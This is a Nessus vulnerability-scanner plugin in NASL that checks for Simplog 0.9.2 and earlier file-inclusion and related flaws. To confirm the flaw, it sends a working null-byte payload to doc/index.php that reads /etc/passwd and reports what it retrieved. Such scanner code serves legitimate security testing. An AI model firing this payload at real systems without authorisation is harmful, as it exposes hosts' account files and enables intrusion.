#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21224);
  script_version("$Revision: 1.19 $");

  script_cve_id(
    "CVE-2006-1776", 
    "CVE-2006-1777", 
    "CVE-2006-1778", 
    "CVE-2006-1779"
  );
  script_bugtraq_id(17490, 17491, 17493);
  script_osvdb_id(24559, 24560, 24561, 24562);

  script_name(english:"Simplog <= 0.9.2 Multiple Vulnerabilities");
  script_summary(english:"Tries to read /etc/passwd using Simplog");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to
multiple issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Simplog, an open source blogging tool
written in PHP. 

The version of Simplog installed on the remote host fails to sanitize
input to the 's' parameter of the 'doc/index.php' script before using
it in a PHP 'include()' function.  Provided PHP's 'register_globals'
setting is enabled, an unauthenticated attacker may be able to exploit
this issue to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts. 

In addition, it also reportedly is affected by various SQL injection,
cross-site scripting, and information disclosure vulnerabilities." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/430743/30/0/threaded" );
  # http://web.archive.org/web/20060714044854/http://simplog.org/bugs/bug.php?op=show&bugid=57
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e61a50bd" );
  # http://web.archive.org/web/20061014091509/http://www.simplog.org/archive.php?blogid=1&pid=56
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?25b91ebc" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Simplog 0.9.3 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/04/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/04/11");
 script_cvs_date("$Date: 2015/09/24 23:21:20 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:simplog:simplog");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/simplog", "/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/doc/index.php?",
      "s=", file
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # It's from Simplog and..
    'href="index.php?s=user">User\'s Guide</a>' >< res &&
    (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or "failed opening".
      #
      # nb: this suggests magic_quotes_gpc was enabled but an attacker with
      #     local access and/or remote file inclusion might still work.
      egrep(pattern:"main\(/etc/passwd\\0\.html.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = strstr(res, "User's Guide");
      if (contents) contents = strstr(contents, "<p>");
      if (contents) contents = contents - "<p>";
      if (contents) contents = contents - strstr(contents, "</p>");
    }

    if (isnull(contents)) security_hole(port);
    else
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }

    exit(0);
  }
}
